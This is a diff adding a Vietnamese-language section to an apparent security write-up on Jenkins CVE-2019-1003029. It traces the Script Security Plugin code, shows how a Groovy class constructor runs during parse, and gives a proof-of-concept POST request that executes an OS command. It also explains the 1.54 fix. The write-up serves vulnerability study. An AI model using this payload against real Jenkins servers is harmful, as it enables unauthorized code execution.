@@ -295,6 +295,118 @@ import Vietnq
   <img src="image/3.png">
   <img src="image/4.png">
   
+ ### 3. CVE-2019-1003029
+ Tương tự kiểu lỗi ở trên, Script Security Plugin phiên bản 1.53 trở xuống cũng tồn tại lỗ hống giúp bypass sandbox và gây ra lỗi RCE. [org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript](https://github.com/jenkinsci/script-security-plugin/blob/script-security-1.53/src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/SecureGroovyScript.java) và ở method "doCheckScript" 
+ 
+ ```java
+	@RequirePOST
+        public FormValidation doCheckScript(@QueryParameter String value, @QueryParameter boolean sandbox) {
+            try {
+                new GroovyShell(Jenkins.getInstance().getPluginManager().uberClassLoader,
+                        GroovySandbox.createSecureCompilerConfiguration()).parse(value);
+            } catch (CompilationFailedException x) {
+                return FormValidation.error(x.getLocalizedMessage());
+            }
+            return sandbox ? FormValidation.ok() : ScriptApproval.get().checking(value, GroovyLanguage.get());
+        }
+ ```
+ 
+ Ta thấy method này thực hiện hành động GroovyShell.parse, tự hỏi không biết trong hàm parse này có gì? Mình quyết định nhảy vào đó xem sao:
+ 
+ ```java
+ public Script parse(String scriptText) throws CompilationFailedException {
+        return parse(scriptText, generateScriptName());
+    }
+ ```
+ 
+ ```java
+ public Script parse(final String scriptText, final String fileName) throws CompilationFailedException {
+        GroovyCodeSource gcs = AccessController.doPrivileged(new PrivilegedAction<GroovyCodeSource>() {
+            public GroovyCodeSource run() {
+                return new GroovyCodeSource(scriptText, fileName, DEFAULT_CODE_BASE);
+            }
+        });
+        return parse(gcs);
+    }
+ ```
+ *Tiếp tục nhảy tới hàm "parse(gcs)"*
+ ```java
+ public Script parse(final GroovyCodeSource codeSource) throws CompilationFailedException {
+        return InvokerHelper.createScript(parseClass(codeSource), context);
+    }
+ ```
+ *Mình nhảy vào " InvokerHelper.createScript" và tìm thấy:*
+ 
+ ```java
+ public static Script createScript(Class scriptClass, Binding context) {
+        Script script;
+
+        if (scriptClass == null) {
+            script = new NullScript(context);
+        } else {
+            try {
+                if (Script.class.isAssignableFrom(scriptClass)) {
+                    try {
+                        Constructor constructor = scriptClass.getConstructor(Binding.class);
+                        script = (Script) constructor.newInstance(context);
+                    } catch (NoSuchMethodException e) {
+                        // Fallback for non-standard "Script" classes.
+                        script = (Script) scriptClass.newInstance();
+                        script.setBinding(context);
+                    }
+                } else {
+                    final GroovyObject object = (GroovyObject) scriptClass.newInstance();
+                    // it could just be a class, so let's wrap it in a Script
+                    // wrapper; though the bindings will be ignored
+
+		    ...
+		    ...
+ ```
+ Ta nhìn thấy ngay là tại đây constructor của script đưa vào đã được gọi :) :). Tuyệt vời, vì groovy có phương thức ''.exceute() có thể thực thi các câu lệnh os nên ta có ngay PoC:
+ 
+ ```url
+ POST http://[jenkins-host]/securityRealm/user/user1/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&
+ 	value=
+ 	public class poc {
+ 		poc() {
+			"calc".execute()}
+		}
+ ```
+ ##### Fix: 
+ 
+ Tại phiên bản  Script Security Plugin **1.54**, mình thấy method *"doCheckScript"* đã sử dụng thêm method *"GroovySandbox.checkScriptForCompilationErrors"*
+ ```java
+ @SuppressFBWarnings(value = "DP_CREATE_CLASSLOADER_INSIDE_DO_PRIVILEGED", justification = "Irrelevant without SecurityManager.")
+        @RequirePOST
+        public FormValidation doCheckScript(@QueryParameter String value, @QueryParameter boolean sandbox) {
+            FormValidation validationResult = GroovySandbox.checkScriptForCompilationErrors(value,
+                    new GroovyClassLoader(Jenkins.getInstance().getPluginManager().uberClassLoader));
+            if (validationResult.kind != FormValidation.Kind.OK) {
+                return validationResult;
+            }
+            return sandbox ? FormValidation.ok() : ScriptApproval.get().checking(value, GroovyLanguage.get());
+        }
+ ```
+ Theo như [công bổ](https://www.jenkins.io/security/advisory/2019-03-06/) của jenkins, thì đây là hàm kiểm tra script an toàn hơn
+ 
+ ```java
+ public static @Nonnull FormValidation checkScriptForCompilationErrors(String script, GroovyClassLoader classLoader) {
+        try {
+            CompilationUnit cu = new CompilationUnit(
+                    createSecureCompilerConfiguration(),
+                    new CodeSource(new URL("file", "", DEFAULT_CODE_BASE), (Certificate[]) null),
+                    classLoader);
+            cu.addSource("Script1", script);
+            cu.compile(Phases.CANONICALIZATION);
+        } catch (MalformedURLException | CompilationFailedException e) {
+            return FormValidation.error(e.getLocalizedMessage());
+        }
+
+        return FormValidation.ok();
+    }
+ ```
+ 
 #### Ref:
 - https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
 - https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
+- https://2019.pass-the-salt.org/files/slides/12-Hacking_Jenkins.pdf
